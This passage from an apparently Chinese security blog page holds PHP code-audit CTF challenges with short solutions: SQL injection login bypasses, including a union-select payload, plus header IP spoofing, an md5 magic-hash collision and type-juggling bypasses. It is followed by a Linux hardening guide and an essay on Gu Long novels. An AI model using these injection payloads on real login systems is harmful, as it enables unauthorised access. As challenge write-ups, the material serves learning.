+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn = mysql_connect(&quot;*******&quot;, &quot;****&quot;, &quot;****&quot;);</span><br><span class="line">    mysql_select_db(&quot;****&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">    if ($conn-&gt;connect_error) &#123;</span><br><span class="line">        die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = &quot;select user from php where (user=&#x27;$user&#x27;) and (pw=&#x27;$pass&#x27;)&quot;;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">    printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">//echo $row[&quot;pw&quot;];</span><br><span class="line">  if($row[&#x27;user&#x27;]==&quot;admin&quot;) &#123;</span><br><span class="line">    echo &quot;&lt;p&gt;Logged in! Key: *********** &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if($row[&#x27;user&#x27;] != &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>闭合注入，绕过验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function GetIP()&#123;</span><br><span class="line">if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))</span><br><span class="line">    $cip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];</span><br><span class="line">else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]))</span><br><span class="line">    $cip = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];</span><br><span class="line">else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;]))</span><br><span class="line">    $cip = $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">else</span><br><span class="line">    $cip = &quot;0.0.0.0&quot;;</span><br><span class="line">return $cip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$GetIPs = GetIP();</span><br><span class="line">if ($GetIPs==&quot;1.1.1.1&quot;)&#123;</span><br><span class="line">echo &quot;Great! Key is *********&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;错误！你的IP不在访问列表之内！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>添加http头即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$md51 = md5(&#x27;QNKCDZO&#x27;);</span><br><span class="line">$a = @$_GET[&#x27;a&#x27;];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    echo &quot;nctf&#123;*****************&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>240610708神奇的数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id = intval($_GET[id]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#x27;$id&#x27;&quot;));</span><br><span class="line">  if ($_GET[id]==1024) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">    echo($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>1024.1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (isset ($_GET[&#x27;nctf&#x27;])) &#123;</span><br><span class="line">    if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;nctf&#x27;]) === FALSE)</span><br><span class="line">        echo &#x27;必须输入数字才行&#x27;;</span><br><span class="line">    else if (strpos ($_GET[&#x27;nctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE)   </span><br><span class="line">        die(&#x27;Flag: &#x27;.$flag);</span><br><span class="line">    else</span><br><span class="line">        echo &#x27;骚年，继续努力吧啊~&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此处还可以数组绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &#x27;db.inc.php&#x27;;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">    if(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $str=stripslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line">    return htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[&#x27;username&#x27;]);</span><br><span class="line">$password = @clean((string)$_GET[&#x27;password&#x27;]);</span><br><span class="line"></span><br><span class="line">$query=&#x27;SELECT * FROM users WHERE name=\&#x27;&#x27;.$username.&#x27;\&#x27; AND pass=\&#x27;&#x27;.$password.&#x27;\&#x27;;&#x27;;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">    die(&#x27;Invalid password!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query=&#x27;SELECT * FROM users WHERE name=\&#x27;&#x27;admin\&#x27;\&#x27; AND pass=\&#x27;&#x27;or 1 #&#x27;\&#x27;;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#x27; $user &#x27;&quot;));</span><br><span class="line">  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line"></span><br><span class="line">    //strcasecmp:0 - 如果两个字符串相等</span><br><span class="line"></span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:user=admin&#x27; and 0=1 union select &#x27;47bce5c74f589f4867dbd57e9ca9f808&#x27; #&amp;pass=aaa</span><br></pre></td></tr></table></figure>
+
+
+
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sat Oct 01 2016 21:00:00 GMT+0800">2016-10-01</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/">安全技术</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/PHP/">PHP</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1TIPS/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/">
+                        Linux系统加固
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        为空口令用户设置密码1234cat /etc/passwd    注册名：口令：用户标识号：组标识号：用户名：用户主目录：命令解释程序     查看是否存在空口令用户（X为存在密码，*为被封禁）passwd 空口令用户名
+缺省密码长度限制1234vim /etc/login.defs 查看PASS_MIN_LEN选项值PASS_MIN_LEN  8设置密码长度最短为8
+缺省密码生存周期限制1234vim /etc/login.defs PASS_MAX_DAYS 90PASS_MIN_DAYS 0设置帐户口令的生存期不长于90 天
+口令过期提醒123vim /etc/login.defsPASS_WARN_AGE 7口令到期前多少天开始通知用户口令即将到期
+限制超级管理员远程登录1234567vim /etc/ssh/sshd_config把PermitRootLogin yes修改为noservice sshd restart重启sshd服务如果遇到sshd: unrecognized service错误尝试一下service ssh restart用ps -ef | grep sshd查看一下服务是否启动
+
+
+为不同的管理员分配不同的账户12345cat /etc/passwduseradd usernamepasswd password增加新用户chmod 777 目录
+去除不需要的帐号、修改默认帐号的shell变量12345678cat /etc/passwdcat /etc/shadow删除不需要的账户userdel usernamegroupdel username设置shellusermod -s /dev/hull username
+对系统账号进行登陆限制12345678910禁止某用户登陆example：bin:x:2:2:bin:/bin:/bin/bash=&gt;bin:x:2:2:bin:/bin:/bin/nologin禁用bin用户登陆touch /etc/nologin禁止除root以外所有用户登陆建议禁掉的用户：daemon   bin  sys  adm  lp   uucp   nuucp  smmsp等
+设置关键目录的权限1234关键目录：chmod 644 /etc/passwd chmod 600 /etc/shadow chmod 644 /etc/group
+设置目录权限123ls -l查看权限权限前边的ld为d是目录文件,l是链接文件chmod -R 750 /etc/init.d/*
+设置关键文件的属性禁止ping12# echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all 开启# echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all  关闭
+初始化12&gt; iptables -F   #清空所有的链&gt; iptables -X  #清空所有自定义的链
+关掉全部端口12&gt; iptables -P INPUT DROP&gt; iptables -P OUTPUT DROP
+开启端口第一步123456789101112iptables -A INPUT -p icmp --icmp-type any -j ACCEPT允许icmp包进入iptables -A INPUT -s localhost -d localhost -j ACCEPT允许本地的数据包iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT允许已经建立和相关的数据包进入iptables -A OUTPUT -p icmp --icmp any -j ACCEPT允许icmp包出去iptables -A OUTPUT -s localhost -d localhost -j ACCEPT允许本地数据包iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT允许已经建立和相关的数据包出去
+关闭端口号12iptables -I INPUT -i eth0 -p tcp --dport 81 -j DROPiptables -I OUTPUT -o eth0 -p tcp --sport 81 -j DROP
+打开端口号12iptables -I INPUT -i eth0 -p tcp --dport 81 -j ACCEPTiptables  -I OUTPUT -o eth0 -p tcp --sport 81 -j ACCEPT
+
+
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h3 id="为空口令用户设置密码"><a href="#为空口令用户设置密码" class="headerlink" title="为空口令用户设置密码"></a>为空口令用户设置密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">    注册名：口令：用户标识号：组标识号：用户名：用户主目录：命令解释程序 </span><br><span class="line">    查看是否存在空口令用户（X为存在密码，*为被封禁）</span><br><span class="line">passwd 空口令用户名</span><br></pre></td></tr></table></figure>
+<h3 id="缺省密码长度限制"><a href="#缺省密码长度限制" class="headerlink" title="缺省密码长度限制"></a>缺省密码长度限制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/login.defs </span><br><span class="line">查看PASS_MIN_LEN选项值</span><br><span class="line">PASS_MIN_LEN  8</span><br><span class="line">设置密码长度最短为8</span><br></pre></td></tr></table></figure>
+<h3 id="缺省密码生存周期限制"><a href="#缺省密码生存周期限制" class="headerlink" title="缺省密码生存周期限制"></a>缺省密码生存周期限制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/login.defs </span><br><span class="line">PASS_MAX_DAYS 90</span><br><span class="line">PASS_MIN_DAYS 0</span><br><span class="line">设置帐户口令的生存期不长于90 天</span><br></pre></td></tr></table></figure>
+<h3 id="口令过期提醒"><a href="#口令过期提醒" class="headerlink" title="口令过期提醒"></a>口令过期提醒</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/login.defs</span><br><span class="line">PASS_WARN_AGE 7</span><br><span class="line">口令到期前多少天开始通知用户口令即将到期</span><br></pre></td></tr></table></figure>
+<h3 id="限制超级管理员远程登录"><a href="#限制超级管理员远程登录" class="headerlink" title="限制超级管理员远程登录"></a>限制超级管理员远程登录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">把PermitRootLogin yes修改为no</span><br><span class="line">service sshd restart</span><br><span class="line">重启sshd服务</span><br><span class="line">如果遇到sshd: unrecognized service错误</span><br><span class="line">尝试一下service ssh restart</span><br><span class="line">用ps -ef | grep sshd查看一下服务是否启动</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="为不同的管理员分配不同的账户"><a href="#为不同的管理员分配不同的账户" class="headerlink" title="为不同的管理员分配不同的账户"></a>为不同的管理员分配不同的账户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">useradd username</span><br><span class="line">passwd password</span><br><span class="line">增加新用户</span><br><span class="line">chmod 777 目录</span><br></pre></td></tr></table></figure>
+<h3 id="去除不需要的帐号、修改默认帐号的shell变量"><a href="#去除不需要的帐号、修改默认帐号的shell变量" class="headerlink" title="去除不需要的帐号、修改默认帐号的shell变量"></a>去除不需要的帐号、修改默认帐号的shell变量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/shadow</span><br><span class="line">删除不需要的账户</span><br><span class="line">userdel username</span><br><span class="line">groupdel username</span><br><span class="line"></span><br><span class="line">设置shell</span><br><span class="line">usermod -s /dev/hull username</span><br></pre></td></tr></table></figure>
+<h3 id="对系统账号进行登陆限制"><a href="#对系统账号进行登陆限制" class="headerlink" title="对系统账号进行登陆限制"></a>对系统账号进行登陆限制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">禁止某用户登陆</span><br><span class="line">example：</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/bash</span><br><span class="line">=&gt;</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/nologin</span><br><span class="line">禁用bin用户登陆</span><br><span class="line"></span><br><span class="line">touch /etc/nologin</span><br><span class="line">禁止除root以外所有用户登陆</span><br><span class="line">建议禁掉的用户：daemon   bin  sys  adm  lp   uucp   nuucp  smmsp等</span><br></pre></td></tr></table></figure>
+<h3 id="设置关键目录的权限"><a href="#设置关键目录的权限" class="headerlink" title="设置关键目录的权限"></a>设置关键目录的权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">关键目录：</span><br><span class="line">chmod 644 /etc/passwd </span><br><span class="line">chmod 600 /etc/shadow </span><br><span class="line">chmod 644 /etc/group</span><br></pre></td></tr></table></figure>
+<h3 id="设置目录权限"><a href="#设置目录权限" class="headerlink" title="设置目录权限"></a>设置目录权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l查看权限</span><br><span class="line">权限前边的ld为d是目录文件,l是链接文件</span><br><span class="line">chmod -R 750 /etc/init.d/*</span><br></pre></td></tr></table></figure>
+<h3 id="设置关键文件的属性"><a href="#设置关键文件的属性" class="headerlink" title="设置关键文件的属性"></a>设置关键文件的属性</h3><h3 id="禁止ping"><a href="#禁止ping" class="headerlink" title="禁止ping"></a>禁止ping</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all 开启</span><br><span class="line"># echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all  关闭</span><br></pre></td></tr></table></figure>
+<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; iptables -F   #清空所有的链</span><br><span class="line">&gt; iptables -X  #清空所有自定义的链</span><br></pre></td></tr></table></figure>
+<h3 id="关掉全部端口"><a href="#关掉全部端口" class="headerlink" title="关掉全部端口"></a>关掉全部端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; iptables -P INPUT DROP</span><br><span class="line">&gt; iptables -P OUTPUT DROP</span><br></pre></td></tr></table></figure>
+<h3 id="开启端口第一步"><a href="#开启端口第一步" class="headerlink" title="开启端口第一步"></a>开启端口第一步</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-type any -j ACCEPT</span><br><span class="line">允许icmp包进入</span><br><span class="line">iptables -A INPUT -s localhost -d localhost -j ACCEPT</span><br><span class="line">允许本地的数据包</span><br><span class="line">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">允许已经建立和相关的数据包进入</span><br><span class="line">iptables -A OUTPUT -p icmp --icmp any -j ACCEPT</span><br><span class="line">允许icmp包出去</span><br><span class="line">iptables -A OUTPUT -s localhost -d localhost -j ACCEPT</span><br><span class="line">允许本地数据包</span><br><span class="line">iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">允许已经建立和相关的数据包出去</span><br></pre></td></tr></table></figure>
+<h3 id="关闭端口号"><a href="#关闭端口号" class="headerlink" title="关闭端口号"></a>关闭端口号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -i eth0 -p tcp --dport 81 -j DROP</span><br><span class="line">iptables -I OUTPUT -o eth0 -p tcp --sport 81 -j DROP</span><br></pre></td></tr></table></figure>
+<h3 id="打开端口号"><a href="#打开端口号" class="headerlink" title="打开端口号"></a>打开端口号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -i eth0 -p tcp --dport 81 -j ACCEPT</span><br><span class="line">iptables  -I OUTPUT -o eth0 -p tcp --sport 81 -j ACCEPT</span><br></pre></td></tr></table></figure>
+
+
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Thu Sep 01 2016 21:00:00 GMT+0800">2016-09-01</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/">安全技术</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/dev/">dev</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/%E9%95%BF%E7%94%9F%E5%89%91%E4%B8%8E%E5%AD%94%E9%9B%80%E7%BF%8E/">
+                        长生剑与孔雀翎
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        
+
+长生剑
+
+1234天上白玉京五楼十二城仙人抚我顶结发受长生
+
+1白玉京不在天上，在马上
+
+12345白玉京并不在天上，在马上他的马鞍已经很陈旧，他的靴子和剑鞘同样陈旧，但他的衣服却是崭新的他的剑鞘已经敲着马鞍，春风吹在他脸上他觉得很愉快，很舒服旧马鞍坐着舒服，旧靴子穿着舒服，旧剑鞘绝不会损伤他的剑锋，新衣服也总是令他觉得精神抖擞，活力充沛
+
+1白玉京叹道：“一笑倾人城，再笑倾人国。再锋利的剑，只怕也比不上美人的一笑”
+
+1他骄傲、任性，有时冲动得像是个孩子，有时却又深沉的像是条狐狸
+
+
+白玉京因为一个女子，卷入江湖最大黑帮的一场纷争，袁紫霞的笑是致命的，甚至比传说中的孔雀翎还要有效，孔雀翎只能杀人，而她的笑还能玩弄男人。一个行走江湖的女人，能懂得用笑来保护自己，满足自己的私欲，是任何武器和武功比不了的
+不过，江湖毕竟是江湖，公平在这是最不值钱的，没有一身铁打的功夫，没有足够的心计，又怎能保护好自己，保护好心爱的人
+所以，我想这就是古龙为什么会在最后感叹这样的一段话
+123456789重要的是，她就在他身旁，而且永远不会再离开他。这就已够了。 　　这就是我说的第一个故事，第一种武器。 　　这故事给我们的教训是一无论多锋利的剑，也比不上那动人的一笑。所以我说的第一种武器，并不是剑，而是笑，只有笑才能真征服人心。 　　所以当你懂得这道理，就应该收起你的剑来多笑一笑！
+
+据说，古龙大叔不仅仅会写书，对于喝酒和女人也是深谙此道，这点我是相信的，没有经历过故事的人，又怎能写出这种趣味和匠心的文字
+白玉京也算是个幸运儿，令万千男儿神魂颠倒的笑容，又怎么能拒绝的了，与心爱的女人，浪迹于天涯，也算是完美的结局了
+写的很乱，也有一些很矛盾的想法，不管怎么说，这都是一部天真但却动人的小说
+在这借用网上一个读者的话
+12特别是当你心情低沉，对爱情和真诚失去信心的时候，重读读「长生剑」，我知道它不够真实，但是，当我们读武侠时，岂不本来就是在希冀属于我们的童话？
+
+
+
+孔雀翎
+
+孔雀翎，是天下第一的暗器，也是天下最美的兵器，纯金打造。当然，它的美不是因为它金光灿灿，而是这些暗器发出来时，美丽的就像孔雀开屏一样，辉煌灿烂。然而，就在你被这种惊人的生灵感动得目瞪神迷时，它已经要了你的性命
+123世上没有任何一种暗器比孔雀翎更可怕，也绝没有任何一种暗器能比孔雀翎更美丽没有人能形容它的美丽，也没有人能避开它、招架它
+
+在这个故事中
+武器终归是武器，再厉害也只是个引子
+高立是个杀手
+秋凤梧也是个杀手
+但他们是相互之间是唯一的朋友
+因为他们背叛了同一个组织，有着相似的品质，同时面对了死亡
+并肩面对死亡的男人，一定会成为至交
+1小武笑了笑，道：”我虽然不喜欢一个人往陷阱里跳，但若有朋友陪着，随便往哪里跳那就没有关系了
+
+123又是黄昏远山在夕阳中由翠绿变为青灰，泉水流到这里，也渐渐慢了
+
+双双并不是一个大众眼中的美人，瘦弱、眼盲、发育不全的畸形儿，像一个做的变了形的没人面具
+但她的脸上却没有任何自卑自怜的神色，反而充满了欢乐和自信
+1小武说：“她的外貌也许并不美，可是她的心却很美，也许比世上大多数美人都美丽的多。”
+
+他们之间，不存在什么辜负不辜负，正如高立说的，“为了她这样的女人，你无论做什么都是值得的”
+当一个人有了羁绊，为了自己珍爱的东西，他不得不去战斗，他必须去扛起武器
+高立向小武借了孔雀翎，打败了敌人，却没有动用孔雀翎
+这是第二种武器
+1无论多可怕的武器，也比不上人类的信心
+
+但这并不是故事的结局
+高立用行动证明了他是个有担当的的男人
